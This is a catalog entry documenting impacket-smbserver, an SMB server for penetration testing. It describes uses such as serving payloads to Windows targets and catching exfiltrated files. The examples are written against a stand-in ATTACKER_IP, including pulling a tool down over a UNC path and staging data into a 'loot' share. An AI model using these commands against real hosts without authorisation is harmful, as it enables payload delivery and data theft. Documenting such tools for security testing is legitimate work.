---
name: "impacket-smbserver"
categories:
  - corpus-windows
homepage: "https://github.com/fortra/impacket"
origin: "corpus"
github-repo: "fortra/impacket"
packaged-by: []
meta-checked: "2026-11-09"
github-commits-year: 169
gh-activity-checked: "2026-11-09"
worth: 6.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
---

# impacket-smbserver

> One-command standalone SMB server: expose a local directory as a share to push files to, or catch files from, Windows hosts.

## What it's for

Kali packaging of `smbserver.py` from fortra/impacket. It starts a
self-contained SMB1/SMB2 server exposing one local directory under a
share name you choose — no Samba install or configuration involved.
Binding the default port 445 needs root. Typical roles: serving payloads
and tools to Windows targets over UNC paths, catching files a
compromised host exfiltrates, and acting as the listener end for
automation that is tricked into touching a UNC path (its console log
shows every connection with the client's account name). Add
`-smb2support` for modern Windows clients, which refuse plain SMB1.
It serves and logs; it does not crack or relay authentication itself.

## Typical use cases

### Serve the current directory over SMB2

```
sudo impacket-smbserver share . -smb2support
```

Outcome: listens on port 445 with the working directory published as
`\\ATTACKER_IP\share`. From the Windows side, `copy
\\ATTACKER_IP\share\tool.exe .` pulls a file down; every connection and
transfer is logged to the console with the connecting username.

### Catch files pushed out from a Windows host

```
sudo impacket-smbserver loot /tmp/loot -smb2support
```

Outcome: opens a writable share named `loot` backed by `/tmp/loot`;
anything the target copies to `\\ATTACKER_IP\loot\` (Explorer drag,
`copy`, or a payload configured to stage out) appears in that directory
and is logged. `-readonly` flips the server to download-only when you
only want to serve.

### Require a username and password

```
sudo impacket-smbserver share . -smb2support -username user -password Password1
```

Outcome: anonymous access is refused; clients must authenticate with the
declared local account (`net use \\ATTACKER_IP\share /user:user
Password1` first, or embed credentials in the triggering application).
Needed when the Windows-side component demands authenticated SMB.
